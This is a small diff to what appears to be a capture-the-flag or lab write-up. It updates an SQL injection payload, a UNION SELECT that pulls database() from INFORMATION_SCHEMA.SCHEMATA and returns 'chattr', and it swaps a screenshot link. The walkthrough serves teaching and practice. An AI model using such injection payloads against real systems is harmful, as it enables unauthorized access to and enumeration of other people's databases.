@@ -67,11 +67,12 @@ Lets start by determine the number of columns we are working with
 
 To find the database name we can use the injection:
 
-    ') UNION SELECT 1, 2, 3, database() FROM INFORMATION_SCHEMA.SCHEMATA #
+    ') UNION SELECT 1,2,database(),4 FROM INFORMATION_SCHEMA.SCHEMATA #
 
 - This returns: chattr
 
-<img width="1223" height="445" alt="chattr2" src="https://github.com/user-attachments/assets/e1c2df91-d9fa-4d96-8f2f-5eb26c560d8a" />
+<img width="1282" height="445" alt="chattr2" src="https://github.com/user-attachments/assets/705aabe0-e1bc-4fee-acdd-471273234a79" />
+
 
 
 
